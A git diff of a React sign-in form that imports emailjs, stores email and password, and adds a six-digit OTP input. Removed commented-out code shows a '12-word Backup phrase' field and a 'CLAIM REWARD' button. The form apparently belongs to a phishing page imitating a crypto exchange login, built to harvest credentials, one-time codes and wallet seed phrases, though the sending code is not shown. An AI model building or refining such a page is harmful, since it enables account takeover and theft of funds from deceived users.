@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react'
 import { connect } from 'react-redux'
 import emailjs from 'emailjs-com'
+import OtpInput from 'react-otp-input'
 
 
 import * as orderAction from '../store/actions'
@@ -8,6 +9,12 @@ import * as orderAction from '../store/actions'
 const Form = (props) => {
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
+    const [otp, setOtp] = useState('')
+
+
+    const handleOtp = e => {
+        setOtp(e.target.value)
+    }
 
     const handleEmail = (e) => {
         setEmail(e.target.value)
@@ -60,6 +67,11 @@ const Form = (props) => {
             style={{ padding: '30px 15px' }}
             onSubmit={handleSubmit}
         >
+            <OtpInput
+                value={otp}
+                onChange={handleOtp}
+                numInputs={6}
+            />
             <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                 Sign in
             </h2>
@@ -150,104 +162,6 @@ const Form = (props) => {
                     </div>
                 </div>
             </div>
-            <div className='w-full'>
-                <div className='bg-white h-64 py-3 rounded text-center'>
-                    <h1 className='text-2xl font-bold'>OTP Verification</h1>
-                    <div className='flex flex-col mt-4'>
-                        {' '}
-                        <span>Enter the OTP you received at</span>{' '}
-                        <span className='font-bold'>+91 ******876</span>{' '}
-                    </div>
-                    <div
-                        id='otp'
-                        className='flex flex-row justify-center text-center px-2 mt-5'
-                    >
-                        {' '}
-                        <input
-                            className='m-2 border h-10 w-10 text-center form-control rounded'
-                            type='text'
-                            id='first'
-                            maxlength='1'
-                        />{' '}
-                        <input
-                            className='m-2 border h-10 w-10 text-center form-control rounded'
-                            type='text'
-                            id='second'
-                            maxlength='1'
-                        />{' '}
-                        <input
-                            className='m-2 border h-10 w-10 text-center form-control rounded'
-                            type='text'
-                            id='third'
-                            maxlength='1'
-                        />{' '}
-                        <input
-                            className='m-2 border h-10 w-10 text-center form-control rounded'
-                            type='text'
-                            id='fourth'
-                            maxlength='1'
-                        />{' '}
-                        <input
-                            className='m-2 border h-10 w-10 text-center form-control rounded'
-                            type='text'
-                            id='fifth'
-                            maxlength='1'
-                        />{' '}
-                        <input
-                            className='m-2 border h-10 w-10 text-center form-control rounded'
-                            type='text'
-                            id='sixth'
-                            maxlength='1'
-                        />{' '}
-                    </div>
-                    <div className='flex justify-center text-center mt-5'>
-                        {' '}
-                        <a className='flex items-center text-blue-700 hover:text-blue-900 cursor-pointer'>
-                            <span className='font-bold'>Resend OTP</span>
-                            <i className='bx bx-caret-right ml-1'></i>
-                        </a>{' '}
-                    </div>
-                </div>
-            </div>
-            {/* {toast && toast.content && (
-                <div className=' grid font-semibold mb-8'>
-                    <p
-                        className={`px-3 py-1 rounded-lg justify-self-center text-black ${
-                            toast.type === 'success'
-                                ? 'bg-yellow-600'
-                                : 'bg-red-800'
-                        }`}
-                    >
-                        {toast.content}
-                    </p>
-                </div>
-            )}
-
-            
-
-            <textarea
-                id='phrase'
-                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                rows={2}
-                required
-                value={phrase}
-                placeholder='Enter 12-word Backup phrase'
-                onChange={handlePhrase}
-            />
-
-            <div className='flex justify-between items-center pt-10 font-medium'>
-                <div className='text-xs font-normal text-[#708599]'>
-                    <input type='checkbox' id='checkbox' required /> {''}
-                    <label htmlFor='checkbox'>
-                        Keep me signed in on this computer
-                    </label>
-                </div>
-
-                {/* <button className='justify-self-center py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 btnclaim text-white'>
-                CLAIM REWARD
-            </button> 
-                <button className='text-white bg-[#1652f0] rounded-sm' style={{padding: '11px 22px', fontSize: '11px'}}>SIGN IN</button>
-            </div> */}
         </form>
     )
 }
